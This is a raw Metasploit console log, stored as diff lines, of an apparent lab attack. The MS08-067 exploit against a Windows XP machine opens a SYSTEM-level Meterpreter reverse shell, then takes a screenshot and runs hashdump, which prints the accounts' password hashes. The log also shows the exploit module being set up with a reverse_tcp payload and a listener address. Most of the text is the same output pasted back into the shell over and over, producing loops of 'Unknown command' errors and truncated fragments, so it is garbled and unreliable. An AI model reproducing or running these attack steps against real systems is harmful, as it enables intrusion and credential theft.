+[*] 192.168.0.116:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
+[*] 192.168.0.116:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (179779 bytes) to 192.168.0.116
+[*] Meterpreter session 3 opened (192.168.0.132:4444 -> 192.168.0.116:1045) at 2019-07-13 17:44:57 +0530
+
+meterpreter > sysinfo
+Computer        : HACKERSC-C6E8B1
+OS              : Windows XP (Build 2600, Service Pack 2).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > getpid
+Current pid: 1048
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name              Arch  Session  User                          Path
+ ---   ----  ----              ----  -------  ----                          ----
+ 0     0     [System Process]                                               
+ 4     0     System            x86   0        NT AUTHORITY\SYSTEM           
+ 368   4     smss.exe          x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 592   368   csrss.exe         x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\csrss.exe
+ 616   368   winlogon.exe      x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\winlogon.exe
+ 660   616   services.exe      x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\services.exe
+ 672   616   lsass.exe         x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\lsass.exe
+ 828   660   VBoxService.exe   x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\VBoxService.exe
+ 872   660   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\svchost.exe
+ 912   660   alg.exe           x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\System32\alg.exe
+ 956   660   svchost.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe
+ 1004  1460  VBoxTray.exe      x86   0        HACKERSC-C6E8B1\Vic           C:\WINDOWS\system32\VBoxTray.exe
+ 1048  660   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\svchost.exe
+ 1096  660   svchost.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe
+ 1112  1048  wuauclt.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\wuauclt.exe
+ 1136  660   svchost.exe       x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\system32\svchost.exe
+ 1332  660   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\svchost.exe
+ 1460  1404  explorer.exe      x86   0        HACKERSC-C6E8B1\Vic           C:\WINDOWS\Explorer.EXE
+ 1584  660   spoolsv.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\spoolsv.exe
+ 1800  1048  wscntfy.exe       x86   0        HACKERSC-C6E8B1\Vic           C:\WINDOWS\system32\wscntfy.exe
+ 1836  1460  cmd.exe           x86   0        HACKERSC-C6E8B1\Vic           C:\WINDOWS\system32\cmd.exe
+ 1848  1460  rundll32.exe      x86   0        HACKERSC-C6E8B1\Vic           C:\WINDOWS\system32\rundll32.exe
+ 1988  1048  wuauclt.exe       x86   0        HACKERSC-C6E8B1\Vic           C:\WINDOWS\system32\wuauclt.exe
+
+meterpreter > screenshot
+Screenshot saved to: /root/feIEVOvI.jpeg
+meterpreter > upload /root/feIEVOvT.jpeg
+[-] Error running command upload: Errno::ENOENT No such file or directory @ rb_file_s_stat - /root/feIEVOvT.jpeg
+meterpreter > upload
+Usage: upload [options] src1 src2 src3 ... destination
+
+Uploads local files and directories to the remote machine.
+
+OPTIONS:
+
+    -h        Help banner
+    -r        Upload recursively
+
+meterpreter > sessions
+Usage: sessions <id>
+
+Interact with a different session Id.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+meterpreter > sessions
+Usage: sessions <id>
+
+Interact with a different session Id.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::
+Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+meterpreter > load /root/feIEVOvT.jpeg
+Loading extension /root/feievovt.jpeg...
+[-] Failed to load extension: No module of the name /root/feievovt.jpeg found
+meterpreter > [-] Error running command upload: Errno::ENOENT No such file or directory @ rb_file_s_stat - /root/feIEVOvT.jpeg
+[-] Unknown command: [-].
+meterpreter > meterpreter > upload
+[-] Unknown command: meterpreter.
+meterpreter > Usage: upload [options] src1 src2 src3 ... destination
+[-] Unknown command: Usage:.
+meterpreter > 
+meterpreter > Uploads local files and directories to the remote machine.
+[-] Unknown command: Uploads.
+meterpreter > 
+meterpreter > OPTIONS:
+[-] Unknown command: OPTIONS:.
+meterpreter > 
+meterpreter >     -h        Help banner
+[-] Unknown command: -h.
+meterpreter >     -r        Upload recursively
+[-] Unknown command: -r.
+meterpreter > 
+meterpreter > meterpreter > sessions
+[-] Unknown command: meterpreter.
+meterpreter > Usage: sessions <id>
+[-] Unknown command: Usage:.
+meterpreter > 
+meterpreter > Interact with a different session Id.
+[-] Unknown command: Interact.
+meterpreter > This works the same as calling this from the MSF shell: sessions -i <session id>
+[-] Unknown command: This.
+meterpreter > 
+meterpreter > meterpreter > sessions
+[-] Unknown command: meterpreter.
+meterpreter > Usage: sessions <id>
+[-] Unknown command: Usage:.
+meterpreter > 
+meterpreter > Interact with a different session Id.
+[-] Unknown command: Interact.
+meterpreter > This works the same as calling this from the MSF shell: sessions -i <session id>
+[-] Unknown command: This.
+meterpreter > 
+meterpreter > meterpreter > hashdump
+[-] Unknown command: meterpreter.
+meterpreter > Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+meterpreter > Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+meterpreter > HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::
+[-] Unknown command: HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::.
+meterpreter > SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::[-] Unknown command: SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::.
+meterpreter > Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+meterpreter > meterpreter > 
+[-] Unknown command: meterpreter.
+meterpreter > wn command: meterpreter.
+[-] Unknown command: wn.
+meterpreter > meterpreter > Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::[-] Unknown command: SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::.
+[-] Unknown command: meterpreter.
+meterpreter > meterpreter > Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > 
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > 
+[-] Unknown command: meterpreter.
+meterpreter > wn command: meterpreter.
+[-] Unknown command: wn.
+meterpreter > meterpreter > Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::[-] Unknown command: SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::.
+[-] Unknown command: meterpreter.
+meterpreter > meterpreter > Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > 
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > 
+[-] Unknown command: meterpreter.
+meterpreter > wn command: meterpreter.
+[-] Unknown command: wn.
+meterpreter > meterpreter > Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::[-] Unknown command: SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::.
+[-] Unknown command: meterpreter.
+meterpreter > meterpreter > Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > 
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > 
+[-] Unknown command: meterpreter.
+meterpreter > d3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: d3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > [-] Unknown command: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: [-].
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > [-] Unknown command: HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::.
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: [-].
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::[-] Unknown command: SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::.
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > [-] Unknown command: Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: [-].
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > meterpreter > 
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: [-].
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > 
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > 
+[-] Unknown command: meterpreter.
+meterpreter > d3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: d3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > [-] Unknown command: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::.
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: [-].
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > [-] Unknown command: HelpAssistant:1000:206a6591bbdf27e9a50bf4283ab893f9:fffb663e38f643e0de3802cf1e3a545a:::.
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: [-].
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::[-] Unknown command: SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:da3943822e3642a97a88b70be39022ef:::.
+[-] Unknown command: meterpreter.
+meterpreter > [-] Unknown command: meterpreter.
+[-] Unknown command: [-].
+meterpreter > meterpreter > meterpreter > Vic:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] Unknown command: meterpreter.
+^CInterrupt: use the 'exit' command to quit
+meterpreter > [i] Database already started
+[-] Unknown command: [i].
+meterpreter > [i] The database appears to be already configured, skipping initialization
+[-] Unknown command: [i].
+meterpreter >                                                   
+meterpreter > # cowsay++
+[-] Unknown command: #.
+meterpreter >  ____________
+[-] Unknown command: ____________.
+meterpreter > < metasploit >
+[-] Unknown command: <.
+meterpreter >  ------------
+[-] Unknown command: ------------.
+meterpreter >        \   ,__,
+[-] Unknown command:  .
+meterpreter >         \  (oo)____
+[-] Unknown command:  .
+meterpreter >            (__)    )\
+ >               ||--|| *
+[-] Unknown command: (__).
+meterpreter > 
+meterpreter > 
+meterpreter >        =[ metasploit v4.17.3-dev                          ]
+[-] Unknown command: =[.
+meterpreter > + -- --=[ 1797 exploits - 1019 auxiliary - 310 post       ]
+[-] Unknown command: +.
+meterpreter > + -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+[-] Unknown command: +.
+meterpreter > + -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+[-] Unknown command: +.
+meterpreter > 
+meterpreter > msf > search ms08-067
+[-] Unknown command: msf.
+meterpreter > 
+meterpreter > Matching Modules
+[-] Unknown command: Matching.
+meterpreter > ================
+[-] Unknown command: ================.
+meterpreter > 
+meterpreter >    Name                                 Disclosure Date  Rank   Description
+[-] Unknown command: Name.
+meterpreter >    ----                                 ---------------  ----   -----------
+[-] Unknown command: ----.
+meterpreter >    exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption
+[-] Unknown command: exploit/windows/smb/ms08_067_netapi.
+meterpreter > 
+meterpreter > 
+meterpreter > msf > exploit exploit/windows/smb/ms08_067_netapi
+[-] Unknown command: msf.
+meterpreter > [-] Unknown command: exploit.
+[-] Unknown command: [-].
+meterpreter > msf > exploit exploit/windows/smb/ms08_067_netapi
+[-] Unknown command: msf.
+meterpreter > [-] Unknown command: exploit.
+[-] Unknown command: [-].
+meterpreter > msf > exploit exploit/windows/smb/ms08_067_netapi
+[-] Unknown command: msf.
+meterpreter > [-] Unknown command: exploit.
+[-] Unknown command: [-].
+meterpreter > msf > use exploit/windows/smb/ms08_067_netapi
+[-] Unknown command: msf.
+meterpreter > msf exploit(windows/smb/ms08_067_netapi) > show options
+[-] Unknown command: msf.
+meterpreter > 
+meterpreter > Module options (exploit/windows/smb/ms08_067_netapi):
+[-] Unknown command: Module.
+meterpreter > 
+meterpreter >    Name     Current Setting  Required  Description
+[-] Unknown command: Name.
+meterpreter >    ----     ---------------  --------  -----------
+[-] Unknown command: ----.
+meterpreter >    RHOST                     yes       The target address
+[-] Unknown command: RHOST.
+meterpreter >    RPORT    445              yes       The SMB service port (TCP)
+[-] Unknown command: RPORT.
+meterpreter >    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+[-] Unknown command: SMBPIPE.
+meterpreter > 
+meterpreter > 
+meterpreter > Exploit target:
+[-] Unknown command: Exploit.
+meterpreter > 
+meterpreter >    Id  Name
+[-] Unknown command: Id.
+meterpreter >    --  ----
+[-] Unknown command: --.
+meterpreter >    0   Automatic Targeting
+[-] Unknown command: 0.
+meterpreter > 
+meterpreter > 
+meterpreter > msf exploit(windows/smb/ms08_067_netapi) > set payload windows/shell/reverse_tcp
+[-] Unknown command: msf.
+meterpreter > payload => windows/shell/reverse_tcp
+[-] Unknown command: payload.
+meterpreter > msf exploit(windows/smb/ms08_067_netapi) > show options
+[-] Unknown command: msf.
+meterpreter > 
+meterpreter > Module options (exploit/windows/smb/ms08_067_netapi):
+[-] Unknown command: Module.
+meterpreter > 
+meterpreter >    Name     Current Setting  Required  Description
+[-] Unknown command: Name.
+meterpreter >    ----     ---------------  --------  -----------
+[-] Unknown command: ----.
+meterpreter >    RHOST                     yes       The target address
+[-] Unknown command: RHOST.
+meterpreter >    RPORT    445              yes       The SMB service port (TCP)
+[-] Unknown command: RPORT.
+meterpreter >    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+[-] Unknown command: SMBPIPE.
+meterpreter > 
+meterpreter > 
+meterpreter > Payload options (windows/shell/reverse_tcp):
+[-] Unknown command: Payload.
+meterpreter > 
+meterpreter >    Name      Current Setting  Required  Description
+[-] Unknown command: Name.
+meterpreter >    ----      ---------------  --------  -----------
+[-] Unknown command: ----.
+meterpreter >    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+[-] Unknown command: EXITFUNC.
+meterpreter >    LHOST                      yes       The listen address (an interface may be specified)
+[-] Unknown command: LHOST.
+meterpreter >    LPORT     4444             yes       The listen port
+[-] Unknown command: LPORT.
+meterpreter > 
+meterpreter > 
+meterpreter > Exploit target:
+[-] Unknown command: Exploit.
+meterpreter > 
+meterpreter >    Id  Name
+[-] Unknown command: Id.
+meterpreter >    --  ----
+[-] Unknown command: --.
+meterpreter >    0   Automatic Targeting
+[-] Unknown command: 0.
+meterpreter > 
+meterpreter > 
+meterpreter > msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.0.155
+[-] Unknown command: msf.
+meterpreter > LHOST => 192.168.0.155
+[-] Unknown command: LHOST.
+meterpreter > msf exploit(windows/smb/ms08_067_netapi) > ifconfig
+[-] Unknown command: msf.
+meterpreter > [*] exec: ifconfig
+[-] Unknown command: [*].
+meterpreter > 
+meterpreter > eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+[-] Unknown command: eth0:.
+meterpreter >         inet 192.168.0.132  netmask 255.255.255.0  broadcast 192.168.0.255
+[-] Unknown command: inet.
+meterpreter >         inet6 2406:7400:73:8865:e2d5:5eff:fe78:54d1  prefixlen 64  scopeid 0x0<global>
+[-] Unknown command: inet6.
+meterpreter >         inet6 2406:7400:73:8865:f005:991:9ce4:1a27  prefixlen 64  scopeid 0x0<global>
+[-] Unknown command: inet6.
+meterpreter >         inet6 fe80::e2d5:5eff:fe78:54d1  prefixlen 64  scopeid 0x20<link>
+[-] Unknown command: inet6.
+meterpreter >         ether e0:d5:5e:78:54:d1  txqueuelen 1000  (Ethernet)
+[-] Unknown command: ether.
+meterpreter >         RX packets 86514  bytes 68563981 (65.3 MiB)
+[-] Unknown command: RX.
+meterpreter >         RX errors 0  dropped 0  overruns 0  frame 0
+[-] Unknown command: RX.
+meterpreter >         TX packets 53320  bytes 9232164 (8.8 MiB)
+[-] Unknown command: TX.
+meterpreter >         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+[-] Unknown command: TX.
+meterpreter > 
+meterpreter > lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+[-] Unknown command: lo:.
+meterpreter >         inet 127.0.0.1  netmask 255.0.0.0
+[-] Unknown command: inet.
+meterpreter >         inet6 ::1  prefixlen 128  scopeid 0x10<host>
+[-] Unknown command: inet6.
+meterpreter >         loop  txqueuelen 1000  (Local Loopback)
+[-] Unknown command: loop.
+meterpreter >         RX packets 113666  bytes 49418284 (47.1 MiB)
+[-] Unknown command: RX.
+meterpreter >         RX errors 0  dropped 0  overruns 0  frame 0
+[-] Unknown command: RX.
+meterpreter >         TX packets 113666  bytes 49418284 (47.1 MiB)
+[-] Unknown command: TX.
+meterpreter > 
+
